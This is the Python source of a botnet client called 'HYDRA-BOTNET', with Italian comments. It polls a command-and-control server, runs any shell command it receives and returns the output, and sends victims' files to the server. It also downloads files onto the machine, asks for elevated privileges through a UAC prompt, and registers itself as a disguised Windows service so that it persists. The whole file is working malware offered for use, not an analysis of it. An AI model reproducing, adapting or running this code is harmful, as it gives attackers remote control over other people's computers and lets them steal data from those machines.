#-*- coding: utf-8 -*-
#!/usr/bin/env python
#######################################################
#                                                     #
#   * HYDRA-BOTNET v.1.0.5.0                          #
#   * Client-side                                     #
#   * Dev:Malcolm Mami                                #
#   * Tested and working with python version 3.10.0   #
#                                                     #
#######################################################
import requests
import time
import socket
import subprocess
import threading
import os
import os.path
from datetime import datetime
import wget
import sys, traceback, types, ctypes
import multiprocessing as mp

def timeout_controller(): # multiprocessing
    t = 0
    while True:    
        if (t < 600):    # 10 minuti di attesa
            t += 1
            
        else:
            try:            
                requests.post(url=hostaddr, data='0P1DH4SCH4NG3D10')
            except:            
                time.sleep(1.0)
                
            time.sleep(1)            
            main_loop()            
            break
            
        time.sleep(1)
    

def get_machinename():        
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)
    return hostname, ip_addr    

def thread_command(command):

    cmd = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    
    st_out_read = cmd.stdout.read().decode('utf-8', 'ignore')
    st_err_read = cmd.stderr.read().decode('utf-8', 'ignore')
    
    if not st_out_read:
        # il comando cade in errore
        output_result = ('R3SU'+st_err_read) # standard output (STDERR)
    else:
        # nessun errore nel comando
        output_result = ('R3SU'+st_out_read) # standard output (STDOUT)
        
    return requests.post(url=hostaddr, data=output_result)


def thread_command_nosync(td_command):
    return subprocess.Popen(td_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

def isUserAdmin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:   # Controllo fallito
        traceback.print_exc()
        return False

def isUserAdmin():
    if os.name == 'nt':
        # Attenzione: richiede Windows XP SP2 o superiore!
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            traceback.print_exc()
            print ("Admin check failed, assuming not an admin.")
            return False
    elif os.name == 'posix':
        return os.getuid() == 0
    else:
        raise (RuntimeError, "OS non supportato da questo modulo: %s" % (os.name,))

def runAsAdmin(cmdLine=None, wait=True):
    if os.name != 'nt':
        raise (RuntimeError, "This function is only implemented on Windows.")

    import win32api, win32con, win32event, win32process
    from win32com.shell.shell import ShellExecuteEx
    from win32com.shell import shellcon

    python_exe = sys.executable

    if cmdLine is None:
        cmdLine = [python_exe] + sys.argv
    elif type(cmdLine) not in (tuple, list):
        raise (ValueError, "cmdLine is not a sequence.")
    cmd = '"%s"' % (cmdLine[0],)

    params = " ".join(['"%s"' % (x,) for x in cmdLine[1:]])
    cmdDir = ''
    showCmd = win32con.SW_SHOWNORMAL

    lpVerb = 'runas'  # Causa UAC prompt di elevazione privilegi

    procInfo = ShellExecuteEx(nShow=showCmd,
                              fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
                              lpVerb=lpVerb,
                              lpFile=cmd,
                              lpParameters=params)

    if wait:
        procHandle = procInfo['hProcess']    
        obj = win32event.WaitForSingleObject(procHandle, win32event.INFINITE)
        rc = win32process.GetExitCodeProcess(procHandle)

    else:
        rc = None

    return rc

def main_loop(): # thread
    
    clock = 0
    wait_time = 0
    short_time = 10 # 10 secs
    mid_time = 120  # 2 mins
    long_time = 600 # 15 mins
    
    hostname, ip_addr = get_machinename()
    
    while True:
    
        try:
            req = requests.post(url=hostaddr, data= '@~id'+hostname+'~'+ip_addr)
            command = req.text
            
            clock = 0
            wait_time = short_time
            
            if 'continue_sleep' in command:
                time.sleep(wait_time)
            
            elif 'quit' in command:
                requests.post(url=hostaddr, data='C0NN_CL0SE')
                
            elif '8#NULLBYT30$' in command:            
                requests.post(url=hostaddr, data='C0NNW41T')
                
            elif '14Y0KS74RTD0WNL0' in command:
                url = (hostaddr + '/store')
                
                with open(rawfileName, 'rb') as f:
                    r = requests.post(url, files={'file': f})
                    
                requests.post(url=hostaddr, data='1036FGTUSOL1029V')  # msg di invio file completato

                
            elif command.startswith('3NTERC0M'):
                command = command[8:]
                
                # * * * * * AVVIO del TIMEOUT * * * * *
                timeout = mp.Process(target=timeout_controller)
                timeout.start()
                
                # ---------------------------------------
                # SUB-LOOP di conversazione con il server
                # ---------------------------------------
                # spostarsi tra le directory di sistema
                if command.startswith('cd '):
                    path = command[3:]
                    try:
                        os.chdir(path)
                        result = ('-->'+path)
                        
                    except:
                        result = ('Impossibile trovare il percorso specificato.')

                    requests.post(url=hostaddr, data=result)
                    timeout.terminate()                    
                #
                # -------------------------------------------
                # Gestisce UPLOAD dei file [CLIENT >> SERVER]
                # -------------------------------------------
                elif command.startswith('1n37dT0u'):

                    # controllo prima che il file esista
                    rawFile = command[8:]
                        
                    FileSplitter = rawFile.split('<#>')
                        
                    FileToUploadName = FileSplitter[0]  # filename
                    FileDimension = FileSplitter[1]     # dimensione originale dei bytes                
                        
                    file_url = (hostaddr + '/' + FileToUploadName)
                    dw = wget.download(file_url)        # download file from host
                        
                    # Controllo se il file esiste
                    if os.path.isfile(FileToUploadName):
                        
                        # controlla la sua dimensione in bytes
                        filesz = os.path.getsize(FileToUploadName)
                            
                        # verifico se corrisponde a quella originale
                        if (str(filesz) == FileDimension):
                            # Download riuscito
                            result = (b'Upload completato')
                        else:
                            # Download fallito file incompleto errore
                            result = (b'Errore upload: file incompleto')
                        
                    else:   # non esiste
                        result = (b'Errore upload: il file non esiste')
                        
                    requests.post(url=hostaddr, data=result)
                    timeout.terminate()                    
                
                elif command.startswith('admck'):
                    if (isUserAdmin() < 1):
                        result = (b'shell con privilegi standard')
                    else:
                        result = (b'shell con privilegi amministrativi')
                    requests.post(url=hostaddr, data=result)
                    timeout.terminate()
                
                elif command.startswith('exec '):
                    td_command = command[5:]
                    thread_command_nosync(td_command)
                    
                    result = (b'comando inviato al thread:\ntieni conto che potrebbe non venir eseguito se errato')
                    requests.post(url=hostaddr, data=result)
                    timeout.terminate()
                    
                elif command.startswith('getsystem '):
                
                    serviceName = command[10:]
                    scriptName = os.path.basename(sys.argv[0])
                    path = os.getcwd()
                    nssmPath = (path + '\\nssm.exe')
                    exePath = (path + '\\' + scriptName)
                    
                    if os.path.exists(nssmPath):
                    
                        if not isUserAdmin():
                                rc = runAsAdmin([nssmPath, 'install', serviceName, exePath])
                                rc = runAsAdmin([nssmPath, 'set', serviceName, 'description', 'Servizio di gestione utenti del sistema Windows'])
                            
                                result = (b'Utente non admin: registrazione del servizio avvenuta')
                                
                        else:                            
                            result = (b'ADMIN! esegui: nssm.exe install [nome_servizio] C:\\..\\script.exe\n poi esegui: nssm.exe set [nome_servizio] description [descrizione]\n rimozione: nssm.exe remove [servizio] confirm')
                    
                    else:
                        result = (b'Errore: nssm.exe non presente')
                        
                    requests.post(url=hostaddr, data=result)
                    
                elif command.startswith('message '):
                
                    msg = command[8:]
                    subprocess.Popen('msg * ' + msg)
                    requests.post(url=hostaddr, data='messaggio inviato')
                    
                elif command.startswith('grab '):
                
                    rawfileName = command[5:]
                    
                    # controllo se il file esiste
                    if os.path.isfile(rawfileName):
                        # esiste
                        # controllo la sua dimensione
                        fileSize = os.path.getsize(rawfileName) # integer                    
                        
                        # invio al server la comunicazione che voglio inviargli il file
                        # deve essere formattato in binario
                        messageToSrvUpload = ('0UPL04DW1LLS74R7'+rawfileName+'<#>'+str(fileSize)) # stringa
                        # conversione da stringa a binario
                        result = str.encode(messageToSrvUpload)                
                        
                    else:
                        # file non esistente
                        result = (b'UN945FT20193810V') # esco correttamente
                        
                    requests.post(url=hostaddr, data=result)
                    timeout.terminate()


                else:
                    bash_cmd = threading.Thread(target=thread_command, args=(command,))
                    bash_cmd.start()
                    bash_cmd.join()                    
                    
                    timeout.terminate()                    
                
            else:
                print('\n[error--host--unreachable]\n')
                time.sleep(wait_time)
                
        except Exception as e:
            print('\n[attempting--to--connect--with--host]\n')
            
            if (clock < 6): # 10s * 6 = 60s
                wait_time = short_time

                clock+=1
            elif (clock < 10): # 2 minuti
                wait_time = mid_time

                clock+=1
            else:              # oltre 15 minuti a blocco
                wait_time = long_time
                
            time.sleep(wait_time)        


if __name__ == '__main__':
    # Indirizzo host
    hostaddr = ('http://127.0.0.1:8080')
    mp.freeze_support()    
    main_loop()
